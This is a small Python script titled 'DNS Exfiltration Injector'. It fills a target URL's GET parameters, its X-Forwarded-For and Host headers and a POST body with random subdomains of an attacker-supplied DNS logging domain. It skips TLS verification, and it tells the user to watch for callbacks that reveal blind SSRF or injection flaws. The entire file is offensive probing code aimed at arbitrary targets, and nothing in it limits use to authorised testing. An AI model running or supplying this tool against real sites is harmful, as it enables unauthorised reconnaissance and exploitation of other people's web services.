#!/usr/bin/env python3
import requests
import argparse
import random
import string
from urllib.parse import urlparse, urlencode, parse_qs
import warnings
warnings.filterwarnings("ignore", category=UserWarning)

def random_sub(domain):
    rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"{rand}.{domain}"

def inject_get(url, dns_host):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    injected_urls = []

    for param in qs:
        payload = random_sub(dns_host)
        qs[param] = payload
        new_query = urlencode(qs, doseq=True)
        full_url = parsed._replace(query=new_query).geturl()
        injected_urls.append((param, full_url))

    return injected_urls

def inject_headers(url, dns_host):
    payload = random_sub(dns_host)
    headers = {
        "User-Agent": "Mozilla/5.0",
        "X-Forwarded-For": payload,
        "Host": payload
    }
    try:
        requests.get(url, headers=headers, timeout=6, verify=False)
        print(f"[🧠] DNS injected into headers with payload: {payload}")
    except:
        print("[!] Header injection failed.")
    
def inject_post(url, dns_host):
    payload = random_sub(dns_host)
    data = {"data": payload}
    try:
        requests.post(url, data=data, timeout=6, verify=False)
        print(f"[📦] DNS injected into POST body: {payload}")
    except:
        print("[!] POST injection failed.")

def main():
    parser = argparse.ArgumentParser(description="📡 DNS Exfiltration Injector")
    parser.add_argument("url", help="Target URL with GET parameters")
    parser.add_argument("--dnslog", help="Your DNS log domain (e.g. abc.oast.online)", required=True)
    args = parser.parse_args()

    print(f"[🔍] Injecting into URL: {args.url}")
    print(f"[🌐] Using DNS log: {args.dnslog}\n")

    # GET parameter injection
    injected = inject_get(args.url, args.dnslog)
    for param, url in injected:
        try:
            requests.get(url, timeout=6, verify=False)
            print(f"[💥] Injected in param '{param}' → {url}")
        except:
            pass

    # Headers and POST
    inject_headers(args.url, args.dnslog)
    inject_post(args.url, args.dnslog)

    print("\n[⏳] Monitor your DNS log panel for incoming requests!")

if __name__ == "__main__":
    main()
